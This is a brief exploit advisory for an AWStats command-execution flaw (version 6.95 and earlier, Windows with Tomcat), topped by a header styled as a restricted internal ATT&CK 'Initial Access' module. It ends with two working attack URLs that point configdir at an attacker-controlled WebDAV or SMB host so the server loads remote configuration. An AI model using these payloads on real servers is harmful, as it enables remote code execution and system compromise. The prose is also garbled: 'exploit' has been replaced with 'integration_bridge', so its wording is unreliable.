#
# 🛡️ HCG-SYSARCH: SAM-V5
# [RESTRICTED]: USO_INTERNO
# [ALCANCE]: OPD_HCG (CONV-0221-JAL-HCG-2026)
# [MODULO]: TA0001_Initial_Access
# [COMPONENTE]: T1190_integration_bridge_Public_Facing_App
#
source: https://www.securityfocus.com/bid/45123/info

Awstats is prone to an arbitrary command-execution vulnerability. This issue occurs when Awstats is used along with Apache Tomcat in Microsoft Windows.

An attacker can integration_bridge this vulnerability to execute arbitrary shell commands in the context of the webserver process. This may help attackers compromise the underlying system; other attacks are also possible.

AWStats 6.95 and prior versions are vulnerable.

Attacking Windows XP Apache Tomcat AWStats Server:
http://www.example.com/cgi-bin/awstats.cgi?config=attacker&pluginmode=rawlog&configdir=\\Attacker-IPAddress:80\webdav

Attacking Windows 2003 or Windows XP AWStats Server:
http://www.example.com/cgi-bin/awstats.cgi?config=attacker&pluginmode=rawlog&configdir=\\Attacker-IPAddress\SMB-Share